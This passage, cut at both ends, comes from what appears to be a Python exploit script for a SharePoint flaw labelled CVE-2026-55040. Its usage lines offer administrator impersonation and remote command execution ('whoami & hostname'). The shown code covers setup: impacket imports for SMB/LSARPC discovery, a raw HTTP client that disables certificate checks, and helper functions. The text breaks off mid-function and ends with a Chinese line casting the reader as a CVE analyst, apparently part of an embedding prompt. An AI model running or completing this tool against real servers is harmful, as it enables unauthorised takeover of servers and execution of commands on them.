12\n#    python CVE-2026-55040.py --host sp.corp.local --upn administrator@corp.local\n#    python CVE-2026-55040.py --host sp.corp.local --rce-cmd \"whoami & hostname\"\n# ======================================================================\n\nimport argparse\nimport base64\nimport hashlib\nimport html as html_mod\nimport http.client\nimport json\nimport os\nimport re\nimport socket\nimport ssl\nimport struct\nimport sys\nimport tempfile\nimport time\nimport urllib.parse\n\n# Optional: impacket (pure-Python) for SMB/LSARPC discovery.\ntry:\n    from impacket.smbconnection import SMBConnection\n    from impacket.dcerpc.v5 import transport, lsat, lsad\n    from impacket.dcerpc.v5.dtypes import NULL\n    IMPACKET = True\nexcept ImportError:\n    IMPACKET = False\n\n# Global: pin hostname -> IP (set in main). Lets us reach a short/NetBIOS\n# hostname by connecting to a concrete IP while sending the right Host/SNI.\nRESOLVE_IP = None\n\n\n# ----------------------------------------------------------------------\n# Low-level HTTP (pure stdlib) -- replaces the old `curl` subprocess calls\n# ----------------------------------------------------------------------\ndef _is_ip(s):\n    for af in (socket.AF_INET, socket.AF_INET6):\n        try:\n            socket.inet_pton(af, s)\n            return True\n        except (OSError, socket.error):\n            continue\n    return False\n\n\ndef http_request(method, url, headers=None, body=None,\n                 host_override=None, ip_override=None,\n                 port_override=None, timeout=60):\n    \"\"\"HTTP(S) request in pure Python.\n\n    Returns (status:int, headers:list[(name,value)], body:bytes).\n    Connects to an IP while presenting a different hostname (Host/SNI)\n    when `ip_override`/RESOLVE_IP is set.\n    \"\"\"\n    parsed = urllib.parse.urlparse(url)\n    scheme = (parsed.scheme or \"https\").lower()\n    netloc = parsed.netloc or url\n    host = host_override or netloc.split(\"@\")[-1].split(\":\")[0]\n    path = parsed.path or \"/\"\n    if parsed.query:\n        path += \"?\" + parsed.query\n\n    ip = ip_override or RESOLVE_IP or host\n    port = port_override or (443 if scheme == \"https\" else 80)\n\n    sock = socket.create_connection((ip, port), timeout=timeout)\n    if scheme == \"https\":\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n        sni = None if _is_ip(host) else host          # don't send an IP as SNI\n        sock = ctx.wrap_socket(sock, server_hostname=sni)\n\n    conn_cls = (http.client.HTTPSConnection if scheme == \"https\"\n                else http.client.HTTPConnection)\n    conn = conn_cls(host, port)\n    conn.sock = sock                                   # reuse our (TLS) socket\n\n    hdrs = dict(headers or {})\n    hdrs.setdefault(\"Host\", host)\n\n    conn.request(method, path, body=(body if body is not None else None),\n                 headers=hdrs)\n    resp = conn.getresponse()\n    data = resp.read()\n    status = resp.status\n    rheaders = resp.getheaders()\n    try:\n        conn.close()\n    except Exception:\n        pass\n    return status, rheaders, data\n\n\ndef find_header(headers, name):\n    nl = name.lower()\n    for k, v in headers:\n        if k.lower() == nl:\n            return v\n    return None\n\n\n# ----------------------------------------------------------------------\n# Small helpers\n# ----------------------------------------------------------------------\ndef _site_host(host):\n    \"\"\"SharePoint validates Host against the site name: first label for\n    FQDNs, but keep IPs intact.\"\"\"\n    return host if _is_ip(host) else host.split(\".\")[0]\n\n\ndef xml_escape(s):\n    return (s.replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\")\n             .replace(\">\", \"&gt;\").replace('\"', \"&quot;\"))\n\n\ndef b64url_encode(data: bytes) -> str:\n    return base64.urlsaf\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\